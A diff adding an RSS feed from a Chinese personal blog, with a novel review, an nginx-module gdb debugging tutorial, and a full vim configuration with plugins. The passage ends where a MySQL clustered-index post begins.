@@ -1,0 +1,2291 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Post-rsses on Persistence</title>
+    <link>http://xiaojiong.net/post/index.xml</link>
+    <description>Recent content in Post-rsses on Persistence</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Xiaojiong</copyright>
+    <lastBuildDate>Tue, 12 Jul 2016 16:18:39 +0800</lastBuildDate>
+    <atom:link href="http://xiaojiong.net/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>《无声告白》读后感</title>
+      <link>http://xiaojiong.net/2016/07/12/%E6%97%A0%E5%A3%B0%E5%91%8A%E7%99%BD%E8%AF%BB%E5%90%8E%E6%84%9F/</link>
+      <pubDate>Tue, 12 Jul 2016 16:18:39 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/07/12/%E6%97%A0%E5%A3%B0%E5%91%8A%E7%99%BD%E8%AF%BB%E5%90%8E%E6%84%9F/</guid>
+      <description>&lt;p&gt;&amp;emsp;&amp;emsp;我们终此一生，就是要摆脱他人的期待，找到真正的自己。 莉迪亚的一生就是为了满足父母的期待，讨好父母。莉迪亚的父亲詹姆斯，是一个中国人，从小生活在种族歧视中。最大的心愿是努力融入族群。他受过高等教育，哈佛大学的博士，大学的终身教授。娶上了一个普通的白人女人。看起来一切都很美好，但是童年的经历让他把期望都落在了下一代，在儿子身上看到了自己的影子，让自己回忆起了童年不美好的经历。这时候莉迪亚出现了，莉迪亚是一个很会察言观色的孩子，很会从父母的行为找到取悦他们的办法。父亲希望莉迪亚是社交达人，于是莉迪亚就成为了“社交达人”。莉迪亚的母亲玛丽琳是一个美国白人，从小就很优秀，是美国女权运动的代表。与周围的男权的环境格格不入，最大的心愿是与众不同。于是她的梦想不是像她的母亲一样做家庭主妇，而是想当医生，于是有了在办公司亲吻詹姆斯的行为，于是嫁了一个黄种人。玛丽琳母亲的死亡，重新燃起了青年时代玛丽琳对未来的幻想。与是她毅然决然的去重新追梦，不惜抛弃家庭。直到自己的意外怀孕，才被迫终止。&lt;/p&gt;
+
+&lt;p&gt;&amp;emsp;&amp;emsp;莉迪亚就是在这种被父母期望的环境下长大的，母亲的意外出走，对莉迪亚的童年是一个转折。她千方百计的想取悦母亲，并对神许下了诺言。她很好的履行了诺言，但那并不是她想要的。唯一的朋友就是她的哥哥，哥哥收到了哈佛的录取通知书，像是逃出笼子中的鸟，她有些羡慕。与哥哥的冷战，学习成绩的压力，父母的期望越来越大，间接导致了她意外的自杀。&lt;/p&gt;
+
+&lt;p&gt;&amp;emsp;&amp;emsp;其实我们每个人都是莉迪亚，中国有千千万万个莉迪亚。只不过我们中的大部分人都没有出现过意外，还算顺利的长大成人，面对社会。从小我们的肩上就扛上了上一辈未完成的梦想。于是我们努力的去成为他们希望成为的人。从我自己来说，父亲是一个普通的铁路工人，年轻的时候因为一些原因从大学辍学。那时候大学的意义远远不是现在所比拟的。于是父亲的大学梦就顺理成章的落在我的头上，好在自己也算是没有辜负父亲的期望替父亲完成了心愿。不过父亲的梦想完成了以后，我的梦想呢？小时我喜欢音乐，梦想自己会组一个摇滚乐队，这当然是不现实的。随着年龄的增大，人的人生观、价值观、世界观在不停的改变。自己从毕业以后才找到属于自己的梦想，并为之努力着。其实现在想来，自己还是挺幸福和幸运的，自己的工作同时也是自己爱好，每天的工作就是为梦想而坚持着。希望能回到过去看见当初那个迷茫蜷曲在角落的自己，鼓励他、赞美他、拥抱他。谢谢你，还好当初你没有放弃，让现在的自己依然可以像傻逼一样坚持自己的梦想。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>nginx模块开发之调试</title>
+      <link>http://xiaojiong.net/2016/06/06/nginx%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E4%B9%8B%E8%B0%83%E8%AF%95/</link>
+      <pubDate>Mon, 06 Jun 2016 05:29:00 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/06/06/nginx%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E4%B9%8B%E8%B0%83%E8%AF%95/</guid>
+      <description>
+
+&lt;h3 id=&#34;nginx-模块开发之调试&#34;&gt;nginx 模块开发之调试&lt;/h3&gt;
+
+&lt;p&gt;这里以nginx稳定版本1.8.1为例。&lt;/p&gt;
+
+&lt;h3 id=&#34;下载与安装&#34;&gt;下载与安装&lt;/h3&gt;
+
+&lt;p&gt;wget &lt;a href=&#34;http://nginx.org/download/nginx-1.8.1.tar.gz&#34;&gt;http://nginx.org/download/nginx-1.8.1.tar.gz&lt;/a&gt;
+./configure &amp;ndash;prefix=~/Code/dst &amp;ndash;with-debug &amp;ndash;add-module=../module/test&lt;/p&gt;
+
+&lt;h3 id=&#34;前台单进程方式&#34;&gt;前台单进程方式&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;daemon off;#关闭守护进程，使之在前台运行
+master_process off;  #关闭主进程，使只有一个进程
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;gdb调试&#34;&gt;gdb调试:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;~/Code/dst/sbin gdb nginx
+GNU gdb (GDB) 7.9.1
+Copyright (C) 2015 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;
+and &amp;quot;show warranty&amp;quot; for details.
+This GDB was configured as &amp;quot;x86_64-apple-darwin15.0.0&amp;quot;.
+Type &amp;quot;show configuration&amp;quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+For help, type &amp;quot;help&amp;quot;.
+Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
+Reading symbols from nginx...done.
+(gdb) l handler
+33	    ngx_http_core_loc_conf_t *corecf;
+34	    corecf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
+35	    corecf-&amp;gt;handler = handler;
+36	    return NGX_CONF_OK;
+37	};
+38	static ngx_int_t handler(ngx_http_request_t *req) {
+39	    u_char html[1024] = &amp;quot;&amp;lt;h1&amp;gt;This is Test Page!&amp;lt;/h1&amp;gt;&amp;quot;;
+40	    req-&amp;gt;headers_out.status = 200;
+41	    int len = sizeof(html) - 1;
+42	    req-&amp;gt;headers_out.content_length_n = len;
+(gdb) b 42
+Breakpoint 1 at 0x100079d37: file ../module/test/ngx_http_test_module.c, line 42.
+(gdb) run
+Starting program: /Users/xiaojiong/Code/dst/sbin/nginx
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时可以发现当前终端gdb被阻塞。新开一个终端执行：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;curl localhost:8081
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这时候gdb的终端显示为:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) run
+Starting program: /Users/xiaojiong/Code/dst/sbin/nginx
+
+Breakpoint 1, handler (req=0x101804450) at ../module/test/ngx_http_test_module.c:42
+42	    req-&amp;gt;headers_out.content_length_n = len;
+(gdb) p req
+$1 = (ngx_http_request_t *) 0x101804450
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;后台守护进程与worker方式&#34;&gt;后台守护进程与worker方式&lt;/h3&gt;
+
+&lt;p&gt;一般nginx在生产环境都是master为守护进程，然后多个woker处理请求的方式。所以调试的时候也采用这种方式。&lt;/p&gt;
+
+&lt;p&gt;配置文件：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#daemon off;
+#master_process off;
+worker_processes  1; #设置为1是为了方便调试。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;gdb调试:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;~/Code/dst gdb sbin/nginx
+GNU gdb (GDB) 7.9.1
+Copyright (C) 2015 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;
+and &amp;quot;show warranty&amp;quot; for details.
+This GDB was configured as &amp;quot;x86_64-apple-darwin15.0.0&amp;quot;.
+Type &amp;quot;show configuration&amp;quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+For help, type &amp;quot;help&amp;quot;.
+Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
+Reading symbols from sbin/nginx...done.
+(gdb) run
+Starting program: /Users/xiaojiong/Code/dst/sbin/nginx
+[Inferior 1 (process 2018) exited normally]
+(gdb) attach 2021
+Attaching to program: /Users/xiaojiong/Code/dst/sbin/nginx, process 2021
+0x00007fff8fcf0eca in kevent () from /usr/lib/system/libsystem_kernel.dylib
+(gdb) l handler
+33	    ngx_http_core_loc_conf_t *corecf;
+34	    corecf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
+35	    corecf-&amp;gt;handler = handler;
+36	    return NGX_CONF_OK;
+37	};
+38	static ngx_int_t handler(ngx_http_request_t *req) {
+39	    u_char html[1024] = &amp;quot;&amp;lt;h1&amp;gt;This is Test Page!&amp;lt;/h1&amp;gt;&amp;quot;;
+40	    req-&amp;gt;headers_out.status = 200;
+41	    int len = sizeof(html) - 1;
+42	    req-&amp;gt;headers_out.content_length_n = len;
+(gdb) b 42
+Breakpoint 1 at 0x100079d37: file ../module/test/ngx_http_test_module.c, line 42.
+(gdb) c
+Continuing.
+
+Breakpoint 1, handler (req=0x101001050) at ../module/test/ngx_http_test_module.c:42
+42	    req-&amp;gt;headers_out.content_length_n = len;
+(gdb) p req
+$1 = (ngx_http_request_t *) 0x101001050
+(gdb) detach
+Detaching from program: /Users/xiaojiong/Code/dst/sbin/nginx, process 2021
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;attach 2021, 2021为我机器上的worker进程号，你可以用ps aux | grep nginx查看，detach 为退出调试。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>我的vim配置</title>
+      <link>http://xiaojiong.net/2016/05/15/%E6%88%91%E7%9A%84vim%E9%85%8D%E7%BD%AE/</link>
+      <pubDate>Sun, 15 May 2016 05:25:32 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/05/15/%E6%88%91%E7%9A%84vim%E9%85%8D%E7%BD%AE/</guid>
+      <description>
+
+&lt;p&gt;github地址:&lt;a href=&#34;https://github.com/mixiaojiong/tool&#34;&gt;https://github.com/mixiaojiong/tool&lt;/a&gt;
+有好多开源的vim配置，比如k-vim, spf13.
+一直想定制一款自己的vim配置。本配置严重借鉴，k-vim和spf13的配置。&lt;/p&gt;
+
+&lt;h3 id=&#34;vimrc&#34;&gt;.vimrc&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;let mapleader = &#39;,&#39;
+&amp;quot; Vundle
+filetype off
+set rtp+=~/.vim/bundle/Vundle.vim
+call vundle#begin()
+
+&amp;quot; install Vundle bundles
+if filereadable(expand(&amp;quot;~/.vimrc.bundles&amp;quot;))
+	source ~/.vimrc.bundles
+endif
+
+call vundle#end()
+
+&amp;quot; 文件
+filetype on
+filetype indent on                  &amp;quot; 针对不同的文件类型采用不同的缩进格式
+filetype plugin on                  &amp;quot; 允许插件
+filetype plugin indent on           &amp;quot; 启动自动补全
+set encoding=utf-8                  &amp;quot; 设置编码自动识别, 中文引号显示
+set fileencoding=utf-8
+set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1
+&amp;quot; 外观
+set background=dark                 &amp;quot; 主题背景
+colorscheme solarized               &amp;quot; 颜色主题
+syntax on                           &amp;quot; 语法高亮
+set laststatus=2
+set showcmd                         &amp;quot; 显示命令
+set number                          &amp;quot; 显示行号
+set ruler                           &amp;quot; 打开状态栏标尺
+set cursorline                      &amp;quot; 突出显示当前行
+set showmatch                      &amp;quot; 高亮显示匹配的括号
+set matchtime=3                    &amp;quot; 匹配括号高亮的时间(单位：0.1s
+set scrolloff=10                    &amp;quot; 光标到屏幕底端保留 10 行 (光标位于屏底看着非常不舒服的)
+set ruler                           &amp;quot; 显示右下角提示栏
+set showmode                        &amp;quot; 显示左下角状态栏
+set listchars=tab:▸\ ,trail:▫
+set wildmenu                        &amp;quot; 使用菜单形式展示列表
+set wildmode=longest,list,full
+&amp;quot; 基本配置
+set autoread                        &amp;quot; 自动加载文件变化
+set wrap                            &amp;quot; 设定折行
+set textwidth=78                    &amp;quot; N个字符折行
+set history=1000                    &amp;quot; 历史记录1000
+set nocompatible                    &amp;quot; 禁用VI相关
+set backspace=indent,eol,start      &amp;quot; 启用backspace删除
+set clipboard+=unnamed              &amp;quot; 共享剪切板
+set showcmd                         &amp;quot; 输入的命令显示出来
+set iskeyword+=_,$,@,%,#,-          &amp;quot; 带有例如以下符号的单词不要被换行切割
+&amp;quot;set mouse=a                         &amp;quot; 鼠标可用
+set confirm                         &amp;quot; 未保存或者仅仅读时，弹出确认
+set nobackup                        &amp;quot; 不生成备份文件
+set noswapfile                      &amp;quot; 不生成 swap 文件
+set bufhidden=hide                  &amp;quot; 当 buffer 被丢弃的时候隐藏
+set noerrorbells                    &amp;quot; 不发出警告声
+&amp;quot; 搜索
+set ignorecase smartcase            &amp;quot; 搜索忽略大写和小写，但有大写字母时仍保持大写和小写敏感
+set hlsearch                        &amp;quot; 高亮搜索
+set incsearch                       &amp;quot; 增量式搜索,逐字符高亮
+
+&amp;quot; 对齐
+set autoindent                      &amp;quot; 继承前一行的缩进方式。特别适用于多行凝视
+set smartindent                     &amp;quot; 智能折叠
+set smarttab                        &amp;quot; 开启新行时使用智能 tab 缩进
+set expandtab                       &amp;quot; 空格取代Tab
+set tabstop=4                       &amp;quot; Tab 键的宽度
+set shiftwidth=4                    &amp;quot; 行交错宽度
+set softtabstop=4                   &amp;quot; 敲入tab键时实际占有的列数
+
+&amp;quot; 自动
+autocmd! bufwritepost .vimrc source %
+autocmd BufNewFile *.sh,*.py,*.php,*.c exec &amp;quot;:call AutoSetFileHead()&amp;quot;
+autocmd FileType c,cpp,java,go,php,javascript,puppet,python,rust,twig,xml,yml,perl autocmd BufWritePre &amp;lt;buffer&amp;gt; :call &amp;lt;SID&amp;gt;StripTrailingWhitespaces()
+
+&amp;quot; 修改默认键
+&amp;quot; 同物理行上线直接跳
+nnoremap k gk
+nnoremap gk k
+nnoremap j gj
+nnoremap gj j
+&amp;quot; F2 注释
+map &amp;lt;F2&amp;gt;a :DoxAuthor&amp;lt;CR&amp;gt;
+map &amp;lt;F2&amp;gt;f :Dox&amp;lt;CR&amp;gt;
+map &amp;lt;F2&amp;gt;b :DoxBlock&amp;lt;CR&amp;gt;
+map &amp;lt;F2&amp;gt;c O/** */&amp;lt;Left&amp;gt;&amp;lt;Left&amp;gt;&amp;lt;CR&amp;gt;
+&amp;quot; 常用分屏
+map &amp;lt;silent&amp;gt; &amp;lt;F3&amp;gt; &amp;lt;Esc&amp;gt;:He&amp;lt;CR&amp;gt;
+map &amp;lt;silent&amp;gt; &amp;lt;F4&amp;gt; &amp;lt;Esc&amp;gt;:Ve&amp;lt;CR&amp;gt;
+map &amp;lt;silent&amp;gt; &amp;lt;F5&amp;gt; &amp;lt;Esc&amp;gt;:Te&amp;lt;CR&amp;gt;
+&amp;quot; F6 换行开关
+nnoremap &amp;lt;F6&amp;gt; :set wrap! wrap?&amp;lt;CR&amp;gt;
+&amp;quot; F7 复制粘贴网页代码前开启
+set pastetoggle=&amp;lt;F7&amp;gt;
+&amp;quot; F8 显示可打印字符开关
+nnoremap &amp;lt;F8&amp;gt; :set list! list?&amp;lt;CR&amp;gt;
+&amp;quot; F9 显示行号
+nnoremap &amp;lt;F9&amp;gt; :set nu! nu?&amp;lt;CR&amp;gt;
+&amp;quot; 分屏窗口移动
+map &amp;lt;C-j&amp;gt; &amp;lt;C-W&amp;gt;j
+map &amp;lt;C-k&amp;gt; &amp;lt;C-W&amp;gt;k
+map &amp;lt;C-h&amp;gt; &amp;lt;C-W&amp;gt;h
+map &amp;lt;C-l&amp;gt; &amp;lt;C-W&amp;gt;l
+&amp;quot; 行首，行尾
+noremap H ^
+noremap L $
+&amp;quot; 快速输入命令
+nnoremap ; :
+&amp;quot; 快速搜索
+map &amp;lt;space&amp;gt; /
+&amp;quot; 快速切换tabe
+map &amp;lt;leader&amp;gt;gp gT
+map &amp;lt;leader&amp;gt;gn gt
+&amp;quot; normal模式下切换到确切的tab
+noremap &amp;lt;leader&amp;gt;1 1gt
+noremap &amp;lt;leader&amp;gt;2 2gt
+noremap &amp;lt;leader&amp;gt;3 3gt
+noremap &amp;lt;leader&amp;gt;4 4gt
+noremap &amp;lt;leader&amp;gt;5 5gt
+noremap &amp;lt;leader&amp;gt;6 6gt
+noremap &amp;lt;leader&amp;gt;7 7gt
+noremap &amp;lt;leader&amp;gt;8 8gt
+noremap &amp;lt;leader&amp;gt;9 9gt
+noremap &amp;lt;leader&amp;gt;0 :tablast&amp;lt;CR&amp;gt;
+
+&amp;quot;==========================================
+&amp;quot; FileType Settings  文件类型设置
+&amp;quot;==========================================
+
+&amp;quot; 具体编辑文件类型的一般设置，比如不要 tab 等
+autocmd FileType python set tabstop=4 shiftwidth=4 expandtab ai
+autocmd FileType ruby,javascript,html,css,xml set tabstop=4 shiftwidth=4 expandtab ai
+autocmd BufRead,BufNewFile *.md,*.mkd,*.markdown set filetype=markdown.mkd
+autocmd BufRead,BufNewFile *.part set filetype=html
+au BufEnter ~/code/letv/sso/* setlocal tags+=~/code/letv/sso/tags
+
+&amp;quot; 自定义函数 {
+    &amp;quot; 定义函数AutoSetFileHead，自动插入文件头
+    function! AutoSetFileHead()
+        &amp;quot;如果文件类型为.sh文件
+        if &amp;amp;filetype == &#39;sh&#39;
+            call setline(1, &amp;quot;\#!/bin/bash&amp;quot;)
+        endif
+
+        &amp;quot;如果文件类型为python
+        if &amp;amp;filetype == &#39;python&#39;
+            call setline(1, &amp;quot;\#!/usr/bin/env python&amp;quot;)
+            call append(1, &amp;quot;\# encoding: utf-8&amp;quot;)
+        endif
+
+        &amp;quot;如果文件类型为.php文件
+        if &amp;amp;filetype == &#39;php&#39;
+            call setline(1, &amp;quot;&amp;lt;?php&amp;quot;)
+        endif
+
+        &amp;quot;如果文件类型为.c文件
+        if &amp;amp;filetype == &#39;c&#39;
+            call setline(1, &amp;quot;#include &amp;lt;stdio.h&amp;gt;&amp;quot;)
+            call append(1, &amp;quot;\#include &amp;lt;stdlib.h&amp;gt;&amp;quot;)
+            call setline(3, &amp;quot;&amp;quot;)
+            call setline(4, &amp;quot;int main(void) {&amp;quot;)
+        endif
+
+        normal G
+        normal o
+        normal o
+    endfunc
+
+    &amp;quot; 保存文件时删除多余空格
+    fun! &amp;lt;SID&amp;gt;StripTrailingWhitespaces()
+        let l = line(&amp;quot;.&amp;quot;)
+        let c = col(&amp;quot;.&amp;quot;)
+        %s/\s\+$//e
+        call cursor(l, c)
+    endfun
+&amp;quot; }
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;插件-vimrc-bundles&#34;&gt;插件.vimrc.bundles&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;Plugin &#39;VundleVim/Vundle.vim&#39;
+Plugin &#39;altercation/vim-colors-solarized&#39;               &amp;quot; 颜色 
+Plugin &#39;scrooloose/nerdtree&#39;                            &amp;quot; 文件显示
+Plugin &#39;scrooloose/syntastic&#39;                           &amp;quot; 语法检查
+Plugin &#39;Xuyuanp/nerdtree-git-plugin&#39;                    &amp;quot; 文件显示git
+Plugin &#39;jistr/vim-nerdtree-tabs&#39;                        &amp;quot; 文件标签管理
+Plugin &#39;terryma/vim-expand-region&#39;                      &amp;quot; 快速范围选中
+Plugin &#39;vim-scripts/DoxygenToolkit.vim&#39;                 &amp;quot; 注释
+Plugin &#39;vim-airline/vim-airline&#39;                        &amp;quot; airline
+Plugin &#39;vim-airline/vim-airline-themes&#39;                 &amp;quot; airline主题
+Plugin &#39;tpope/vim-fugitive&#39;                             &amp;quot; git
+Plugin &#39;airblade/vim-gitgutter&#39;                         &amp;quot; git
+Plugin &#39;junegunn/vim-easy-align&#39;						&amp;quot; 快速对齐
+Plugin &#39;fatih/vim-go&#39;									&amp;quot; golang
+Plugin &#39;evanmiller/nginx-vim-syntax&#39;					&amp;quot; nginx配置文件
+Plugin &#39;Lokaltog/vim-easymotion&#39;						&amp;quot; 强大的跳转
+Plugin &#39;majutsushi/tagbar&#39;                              &amp;quot; 代码导航
+Plugin &#39;vim-scripts/matchit.zip&#39;                        &amp;quot; html标签匹配
+Plugin &#39;valloric/MatchTagAlways&#39;                        &amp;quot; html标签高亮匹配
+Plugin &#39;maksimr/vim-jsbeautify&#39;                         &amp;quot; 格式化代码
+
+&amp;quot; 插件相关
+&amp;quot; syntastic {
+    &amp;quot; dependence
+    let g:syntastic_error_symbol=&#39;&amp;gt;&amp;gt;&#39;
+    let g:syntastic_warning_symbol=&#39;&amp;gt;&#39;
+    let g:syntastic_check_on_open=1
+    let g:syntastic_check_on_wq=0
+    let g:syntastic_enable_highlighting=1
+
+    &amp;quot;set statusline+=%#warningmsg#
+    &amp;quot;set statusline+=%{SyntasticStatuslineFlag()}
+    &amp;quot;set statusline+=%*
+
+    &amp;quot;let g:syntastic_always_populate_loc_list = 1
+    &amp;quot;let g:syntastic_auto_loc_list = 1
+    &amp;quot;let g:syntastic_check_on_open = 1
+    &amp;quot;let g:syntastic_check_on_wq = 0
+&amp;quot; }
+
+&amp;quot; DoxygenToolkit {
+    let g:DoxygenToolkit_briefTag_pre=&amp;quot;@synopsis  &amp;quot;
+	let g:DoxygenToolkit_paramTag_pre=&amp;quot;@param &amp;quot;
+	let g:DoxygenToolkit_returnTag=&amp;quot;@return   &amp;quot;
+	let g:DoxygenToolkit_authorName=&amp;quot;zhaorui, zhaorui3@le.com&amp;quot;
+&amp;quot; }
+
+&amp;quot; MatchTagAlways {
+    let g:mta_use_matchparen_group = 1
+    let g:mta_filetypes = {
+        \ &#39;html&#39; : 1,
+        \ &#39;xhtml&#39; : 1,
+        \ &#39;xml&#39; : 1,
+        \ &#39;php&#39; : 1,
+        \ &#39;jinja&#39; : 1,
+        \}
+&amp;quot; }
+
+&amp;quot; jsbeautify {
+	map &amp;lt;F6&amp;gt; :call JsBeautify()&amp;lt;cr&amp;gt;
+	&amp;quot; or
+	autocmd FileType javascript noremap &amp;lt;buffer&amp;gt;  &amp;lt;F6&amp;gt; :call JsBeautify()&amp;lt;cr&amp;gt;
+	&amp;quot; for json
+	autocmd FileType json noremap &amp;lt;buffer&amp;gt; &amp;lt;F6&amp;gt; :call JsonBeautify()&amp;lt;cr&amp;gt;
+	&amp;quot; for jsx
+	autocmd FileType jsx noremap &amp;lt;buffer&amp;gt; &amp;lt;F6&amp;gt; :call JsxBeautify()&amp;lt;cr&amp;gt;
+	&amp;quot; for html
+	autocmd FileType html noremap &amp;lt;buffer&amp;gt; &amp;lt;F6&amp;gt; :call HtmlBeautify()&amp;lt;cr&amp;gt;
+	&amp;quot; for css or scss
+	autocmd FileType css noremap &amp;lt;buffer&amp;gt; &amp;lt;F6&amp;gt; :call CSSBeautify()&amp;lt;cr&amp;gt;
+&amp;quot; }
+
+&amp;quot; easymotion {
+    let g:EasyMotion_smartcase = 1
+    &amp;quot;let g:EasyMotion_startofline = 0 &amp;quot; keep cursor colum when JK motion
+    map &amp;lt;Leader&amp;gt;&amp;lt;leader&amp;gt;h &amp;lt;Plug&amp;gt;(easymotion-linebackward)
+    map &amp;lt;Leader&amp;gt;&amp;lt;Leader&amp;gt;j &amp;lt;Plug&amp;gt;(easymotion-j)
+    map &amp;lt;Leader&amp;gt;&amp;lt;Leader&amp;gt;k &amp;lt;Plug&amp;gt;(easymotion-k)
+    map &amp;lt;Leader&amp;gt;&amp;lt;leader&amp;gt;l &amp;lt;Plug&amp;gt;(easymotion-lineforward)
+    &amp;quot; 重复上一次操作, 类似repeat插件, 很强大
+    map &amp;lt;Leader&amp;gt;&amp;lt;leader&amp;gt;. &amp;lt;Plug&amp;gt;(easymotion-repeat)
+&amp;quot; }
+
+&amp;quot; easyalign {
+    vmap &amp;lt;Leader&amp;gt;a &amp;lt;Plug&amp;gt;(EasyAlign)
+    nmap &amp;lt;Leader&amp;gt;a &amp;lt;Plug&amp;gt;(EasyAlign)
+    if !exists(&#39;g:easy_align_delimiters&#39;)
+    let g:easy_align_delimiters = {}
+    endif
+    let g:easy_align_delimiters[&#39;#&#39;] = { &#39;pattern&#39;: &#39;#&#39;, &#39;ignore_groups&#39;: [&#39;String&#39;] }
+&amp;quot; }
+&amp;quot; expandregion {
+    vmap v &amp;lt;Plug&amp;gt;(expand_region_expand)
+    vmap V &amp;lt;Plug&amp;gt;(expand_region_shrink)
+&amp;quot; }
+
+&amp;quot; fugitive {
+    &amp;quot; :Gdiff  :Gstatus :Gvsplit
+    nnoremap &amp;lt;leader&amp;gt;ge :Gdiff&amp;lt;CR&amp;gt;
+    &amp;quot; not ready to open
+    &amp;quot; &amp;lt;leader&amp;gt;gb maps to :Gblame&amp;lt;CR&amp;gt;
+    &amp;quot; &amp;lt;leader&amp;gt;gs maps to :Gstatus&amp;lt;CR&amp;gt;
+    &amp;quot; &amp;lt;leader&amp;gt;gd maps to :Gdiff&amp;lt;CR&amp;gt;  和现有冲突
+    &amp;quot; &amp;lt;leader&amp;gt;gl maps to :Glog&amp;lt;CR&amp;gt;
+    &amp;quot; &amp;lt;leader&amp;gt;gc maps to :Gcommit&amp;lt;CR&amp;gt;
+    &amp;quot; &amp;lt;leader&amp;gt;gp maps to :Git push&amp;lt;CR&amp;gt;
+&amp;quot; }
+
+&amp;quot; gitgutter {
+    &amp;quot; 同git diff,实时展示文件中修改的行
+    &amp;quot; 只是不喜欢除了行号多一列, 默认关闭,gs时打开
+    let g:gitgutter_map_keys = 0
+    let g:gitgutter_enabled = 0
+    let g:gitgutter_highlight_lines = 1
+    nnoremap &amp;lt;leader&amp;gt;gs :GitGutterToggle&amp;lt;CR&amp;gt;
+&amp;quot; }
+
+&amp;quot; nerdtree nerdtreetabs {
+    map &amp;lt;Leader&amp;gt;e &amp;lt;plug&amp;gt;NERDTreeTabsToggle&amp;lt;CR&amp;gt;
+    let NERDTreeHighlightCursorline = 1
+    let NERDTreeIgnore=[ &#39;\.pyc$&#39;, &#39;\.pyo$&#39;, &#39;\.obj$&#39;, &#39;\.o$&#39;, &#39;\.so$&#39;, &#39;\.egg$&#39;, &#39;^\.git$&#39;, &#39;^\.svn$&#39;, &#39;^\.hg$&#39; ]
+    &amp;quot; 只有一个窗口的时候默认关闭
+    autocmd bufenter * if (winnr(&amp;quot;$&amp;quot;) == 1 &amp;amp;&amp;amp; exists(&amp;quot;b:NERDTreeType&amp;quot;) &amp;amp;&amp;amp; b:NERDTreeType == &amp;quot;primary&amp;quot;) | q | end
+    &amp;quot; s/v 分屏打开文件
+    let g:NERDTreeMapOpenSplit = &#39;s&#39;
+    let g:NERDTreeMapOpenVSplit = &#39;v&#39;
+    let g:nerdtree_tabs_open_on_gui_startup = 1
+    &amp;quot;let g:nerdtree_tabs_open_on_console_startup = 1
+    let g:nerdtree_tabs_smart_startup_focus = 2
+    let g:nerdtree_tabs_autoclose = 1
+&amp;quot; }
+
+&amp;quot; airline {
+    if !exists(&#39;g:airline_symbols&#39;)
+        let g:airline_symbols = {}
+    endif
+	let g:airline_theme = &#39;solarized&#39;
+    let g:airline_left_sep = &#39;▶&#39;
+    let g:airline_left_alt_sep = &#39;❯&#39;
+    let g:airline_right_sep = &#39;◀&#39;
+    let g:airline_right_alt_sep = &#39;❮&#39;
+    let g:airline_symbols.linenr = &#39;¶&#39;
+    let g:airline_symbols.branch = &#39;⎇&#39;
+    &amp;quot; 是否打开tabline
+    let g:airline#extensions#tabline#enabled = 1
+&amp;quot; }
+
+&amp;quot; solarized {
+    let g:solarized_termtrans=1
+    let g:solarized_contrast=&amp;quot;normal&amp;quot;
+    let g:solarized_visibility=&amp;quot;normal&amp;quot;
+    &amp;quot;let g:solarized_termcolors=256
+&amp;quot; }
+
+&amp;quot; TagBar {
+    &amp;quot;autocmd VimEnter * TagbarToggle
+	if isdirectory(expand(&amp;quot;~/.vim/bundle/tagbar/&amp;quot;))
+		nnoremap&amp;lt;leader&amp;gt;] :TagbarToggle&amp;lt;CR&amp;gt;
+	endif
+&amp;quot; }
+
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;效果图&#34;&gt;效果图&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ww4.sinaimg.cn/large/68faff51gw1f3xfxxzab4j21kw0y2wof.jpg&#34; alt=&#34;vim&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>mysql 聚簇索引</title>
+      <link>http://xiaojiong.net/2016/04/15/mysql-%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95/</link>
+      <pubDate>Fri, 15 Apr 2016 05:21:44 +0800</pubDate>
+      
